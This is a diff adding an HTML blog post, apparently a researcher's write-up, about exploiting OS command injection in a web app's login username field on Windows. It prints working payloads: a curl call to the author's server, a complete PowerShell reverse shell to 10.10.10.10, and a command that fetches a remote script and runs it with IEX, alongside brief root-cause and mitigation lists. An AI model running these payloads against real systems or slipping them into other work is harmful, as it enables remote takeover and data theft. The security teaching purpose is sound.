@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<title>
+OS Command Injection to Remote Code Execution — thevillagehacker
+</title>
+
+<meta name="description"
+content="Exploiting OS Command Injection for Remote Code Execution."/>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap"
+rel="stylesheet">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+
+<link rel="stylesheet" href="../assets/css/style.css"/>
+
+<style>
+
+.hljs{
+    background:#070b12 !important;
+    color:#d6deeb !important;
+
+    padding:22px !important;
+
+    font-family:var(--font-mono) !important;
+    font-size:14.5px !important;
+    line-height:1.65 !important;
+
+    border-radius:0 0 8px 8px;
+}
+
+.hljs-keyword{color:#c792ea !important;}
+.hljs-string{color:#ecc48d !important;}
+.hljs-title{color:#82aaff !important;}
+.hljs-comment{color:#5c6773 !important;}
+.hljs-number{color:#f78c6c !important;}
+.hljs-built_in{color:#89ddff !important;}
+
+pre{
+    position:relative;
+}
+
+pre::before{
+
+    content:'';
+
+    display:block;
+
+    height:38px;
+
+    border-bottom:1px solid #1e2a38;
+
+    background:
+        radial-gradient(circle at 18px 19px,#ff5f56 0 4px,transparent 5px),
+        radial-gradient(circle at 36px 19px,#ffbd2e 0 4px,transparent 5px),
+        radial-gradient(circle at 54px 19px,#27c93f 0 4px,transparent 5px),
+        linear-gradient(to bottom,#101722,#0c121c);
+
+    border-radius:8px 8px 0 0;
+}
+
+</style>
+
+</head>
+
+<body class="has-site-fx post-page">
+
+<nav class="top-nav landing-nav">
+    <div class="nav-inner landing-nav-inner">
+        <a href="/" class="nav-brand">
+            <span class="nav-prompt">~/</span>thevillagehacker<span class="nav-path">/posts</span>
+            <span class="status-dot" title="research post"></span>
+        </a>
+        <div class="nav-right">
+            <span class="nav-clock" id="nav-clock" aria-hidden="true"></span>
+            <a href="/" class="nav-link">Home</a>
+            <a href="/blog.html" class="nav-link nav-link-active">Blog</a>
+            <a href="https://thevillagehacker-security.gitbook.io/ctf-writeups" class="nav-link" target="_blank" rel="noopener">Writeups</a>
+        </div>
+    </div>
+</nav>
+
+
+<div class="advisory-banner">
+    OS COMMAND INJECTION // POWERSHELL // REMOTE CODE EXECUTION
+</div>
+
+<div class="container">
+
+<header class="header">
+
+    <span class="cve-tag">
+        WEB APPLICATION SECURITY
+    </span>
+
+    <h1>
+        OS Command Injection to Remote Code Execution
+    </h1>
+
+    <p class="subtitle">
+        WINDOWS COMMAND INJECTION // OOB VALIDATION // POWERSHELL RCE
+    </p>
+
+    <div class="meta">
+
+        <div class="meta-item">
+            <div class="label">researcher</div>
+            <div class="value">Naveen Jagadeesan</div>
+        </div>
+
+        <div class="meta-item">
+            <div class="label">published</div>
+            <div class="value">2024-12-10</div>
+        </div>
+
+        <div class="meta-item">
+            <div class="label">platform</div>
+            <div class="value">Windows / Web Application</div>
+        </div>
+
+    </div>
+
+</header>
+
+<article>
+
+<p>
+Exploiting OS Command Injection for Remote Code Execution.
+</p>
+
+<h2>Target Background</h2>
+
+<p>
+The target was an asset management web application allowing
+users to create and manage assets through a centralized portal.
+</p>
+
+<h2>Authentication Mechanisms</h2>
+
+<p>
+The application supported multiple authentication methods:
+</p>
+
+<ul>
+
+<li>Standard username/password login</li>
+
+<li>Google SSO</li>
+
+<li>GitHub SSO</li>
+
+</ul>
+
+<h2>Identifying the Attack Vector</h2>
+
+<p>
+Reconnaissance identified the login form as the primary attack
+surface.
+</p>
+
+<p>
+The <code>username</code> field inside the JSON request object
+was discovered to be vulnerable to OS Command Injection.
+</p>
+
+<h2>Attack Surface Analysis</h2>
+
+<p>
+The application was hosted on a Windows environment which guided
+payload selection during exploitation.
+</p>
+
+<p>
+The application responses returned boolean values:
+</p>
+
+<ul>
+
+<li>true</li>
+
+<li>false</li>
+
+</ul>
+
+<p>
+Due to limited response visibility, out-of-band techniques were
+used to validate exploitation.
+</p>
+
+<h2>Request</h2>
+
+<pre><code class="language-text">
+POST /username_exists HTTP/1.1
+Host: target.com
+Cookie: session cookie: hello
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+
+{
+    "username": "whoami"
+}
+</code></pre>
+
+<h2>Response</h2>
+
+<pre><code class="language-text">
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Content-Type: text/html; charset=utf-8
+
+{
+    "success": false
+}
+</code></pre>
+
+<h2>Out-of-Band Validation</h2>
+
+<p>
+Several OOB payloads were used during testing:
+</p>
+
+<ul>
+
+<li>ping</li>
+
+<li>curl</li>
+
+<li>wget</li>
+
+</ul>
+
+<p>
+Timing differences and outbound requests confirmed successful
+command execution.
+</p>
+
+<h2>Example Payloads</h2>
+
+<pre><code class="language-bash">
+|ping -c 5 127.0.0.1||
+
+|curl https://thevillagehacker.com/exploit/file.txt||
+</code></pre>
+
+<p>
+The curl payload successfully downloaded a remote file from an
+attacker-controlled server, validating the injection vector.
+</p>
+
+<h2>Exploitation</h2>
+
+<p>
+Since the target operated in a Windows environment, a PowerShell
+reverse shell payload was selected.
+</p>
+
+<p>
+This enabled a reverse TCP connection back to the attacker system.
+</p>
+
+<h2>PowerShell Reverse Shell</h2>
+
+<pre><code class="language-ps">
+$client = New-Object System.Net.Sockets.TCPClient(
+'10.10.10.10',80);
+
+$stream = $client.GetStream();
+
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read(
+$bytes, 0, $bytes.Length)) -ne 0){
+
+    $data = (
+    New-Object -TypeName
+    System.Text.ASCIIEncoding
+    ).GetString($bytes,0,$i);
+
+    $sendback = (
+    iex ". { $data } 2>&1"
+    | Out-String );
+
+    $sendback2 =
+    $sendback + 'PS ' +
+    (pwd).Path + '> ';
+
+    $sendbyte =
+    ([text.encoding]::ASCII)
+    .GetBytes($sendback2);
+
+    $stream.Write(
+    $sendbyte,
+    0,
+    $sendbyte.Length
+    );
+
+    $stream.Flush()
+};
+
+$client.Close()
+</code></pre>
+
+<h2>Final Exploitation Payload</h2>
+
+<pre><code class="language-ps">
+|powershell -c
+"IEX(New-Object System.Net.WebClient)
+.DownloadString(
+'https://thevillagehacker.com/mypowershell.ps1'
+)"||
+</code></pre>
+
+<p>
+Injecting the above payload established a reverse shell
+connection to the target server.
+</p>
+
+<p>
+The application executed with administrative privileges,
+resulting in full system compromise.
+</p>
+
+<h2>Impact</h2>
+
+<ul>
+
+<li>Remote Code Execution</li>
+
+<li>Full server compromise</li>
+
+<li>Privilege escalation</li>
+
+<li>Arbitrary command execution</li>
+
+<li>Data access and manipulation</li>
+
+<li>Potential lateral movement</li>
+
+</ul>
+
+<h2>Root Cause</h2>
+
+<ul>
+
+<li>Improper input sanitization</li>
+
+<li>Unsafe command execution</li>
+
+<li>Direct OS command concatenation</li>
+
+<li>Lack of server-side validation</li>
+
+<li>Excessive application privileges</li>
+
+</ul>
+
+<h2>Conclusion</h2>
+
+<p>
+The exploitation of an OS Command Injection vulnerability inside
+the authentication workflow resulted in full remote code execution
+against the target infrastructure.
+</p>
+
+<p>
+This case highlights the importance of:
+</p>
+
+<ul>
+
+<li>Strict input validation</li>
+
+<li>Secure command handling</li>
+
+<li>Least privilege execution</li>
+
+<li>Defense-in-depth controls</li>
+
+</ul>
+
+<h2>Reference</h2>
+
+<ul>
+
+<li>
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+</li>
+
+</ul>
+
+<p>
+Thank you for reading.
+</p>
+
+</article>
+
+<footer>
+
+    <span class="footer-text">
+        © 2026
+        <a href="../index.html">thevillagehacker</a>
+        — Naveen Jagadeesan
+    </span>
+
+    <span class="footer-text">
+        status: active<span class="blink"></span>
+    </span>
+
+</footer>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+<script>
+hljs.highlightAll();
+</script>
+
+    <script src="../assets/js/site.js" defer></script>
+</body>
+</html>
